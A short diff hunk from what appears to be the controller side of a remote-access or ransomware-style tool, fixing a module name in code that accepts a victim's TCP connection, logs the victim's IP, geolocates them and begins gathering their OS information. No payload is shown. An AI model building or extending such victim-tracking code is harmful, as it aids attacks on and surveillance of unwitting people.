@@ -438,7 +438,7 @@ client_ip = encrypter.initialize_tcp_connexion_server(HOST, PORT)
 logging.info("The victim is connected with the following ip : %s", client_ip)
 # Call geolocalisation class to try geolocating approximately the victim with his ip.
 logging.info("Trying to geolocating the victim")
-victimLocalisation = geolocalisation.GeoLocalization(client_ip).locate()
+victimLocalisation = geolocalization.GeoLocalization(client_ip).locate()
 logging.info("Victim is connected from : %s", victimLocalisation)
 consoleCleaner(False)
 # Getting victim's os infos.
